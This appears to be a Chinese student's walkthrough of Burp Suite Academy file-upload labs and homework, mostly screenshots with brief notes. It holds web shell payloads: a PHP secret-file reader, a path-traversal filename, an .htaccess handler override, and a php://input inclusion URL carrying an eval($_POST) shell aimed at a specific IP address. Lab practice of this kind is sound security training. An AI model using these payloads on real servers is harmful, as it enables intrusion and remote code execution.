# burp实验室

### 文件上传1

![image-20250908181037967](images/image-20250908181037967.png)

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

![image-20250908181236252](images/image-20250908181236252.png)

![image-20250908181352634](images/image-20250908181352634.png)

![image-20250908181422203](images/image-20250908181422203.png)





## 第二关

![image-20250908181712954](images/image-20250908181712954.png)

#### 改了content-type，重放

![image-20250908181911381](images/image-20250908181911381.png)

![image-20250908182038825](images/image-20250908182038825.png)



### 第三关

![image-20250908183512876](images/image-20250908183512876.png)

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

模仿前面发现，可以正常上传，但是无法执行语句，访问发现被原封不动的返回了

![image-20250908183552405](images/image-20250908183552405.png)

尝试能否跳出目录，去上一级

```
filename="..%2f1.php"
```

![image-20250908183823015](images/image-20250908183823015.png)

上级目录访问成功

![image-20250908185100736](images/image-20250908185100736.png)





### 第四关

![image-20250908185633161](images/image-20250908185633161.png)

直接试试php的其他后缀

![image-20250908185714838](images/image-20250908185714838.png)

没有被正确的解析

![image-20250908185955249](images/image-20250908185955249.png)



```
上传  .htaccess
内容为
AddType application/x-httpd-php .php5
修改Content-Type:text/plain
```

![image-20250908190333202](images/image-20250908190333202.png)

重新访问test.php5,得到key

![image-20250908190836906](images/image-20250908190836906.png)



## 第五关  通过混淆的文件扩展名上传 Web shell

![image-20250908191001257](images/image-20250908191001257.png)

![image-20250908191420918](images/image-20250908191420918.png)

#### 尝试双后缀，被识别成了图片。。。。

![image-20250908191509141](images/image-20250908191509141.png)

#### 尝试空格阻断

![image-20250908191649952](images/image-20250908191649952.png)

访问

```
/files/avatars/test1.php
```

![image-20250908191811865](images/image-20250908191811865.png)



### 第六关 通过多语言 Web Shell 上传执行远程代码

![image-20250908191916598](images/image-20250908191916598.png)

#### 看着标题就知道会检查16进制的头，我们制作一个优秀的图片马

![image-20250908192708861](images/image-20250908192708861.png)

改一下后缀

![image-20250908192831555](images/image-20250908192831555.png)

得到了

![image-20250908194213957](images/image-20250908194213957.png)

### 第七关 通过竞争条件上传 Web shell

![image-20250908194321213](images/image-20250908194321213.png)

依旧优质图片码，爆破上传

![image-20250908195355478](images/image-20250908195355478.png)

在服务器没反应过来拿下

![image-20250908195328865](images/image-20250908195328865.png)



# 作业2  做不出来

```
http://47.242.11.182:8080/vul/fileinclude/fi_local.php?filename=php://input<?php @eval($_POST['pass']);?>&submit=%E6%8F%90%E4%BA%A4


<?php phpinfo();?>


http://47.242.11.182:8080/vul/fileinclude/fi_local.php?filename=php://input<?php phpinfo();?>
```

![image-20250908201043625](images/image-20250908201043625.png)







# 作业三

![image-20250908220316923](images/image-20250908220316923.png)

一个西红柿？

![image-20250908220425068](images/image-20250908220425068.png)



目录爆破

![image-20250908231635841](images/image-20250908231635841.png)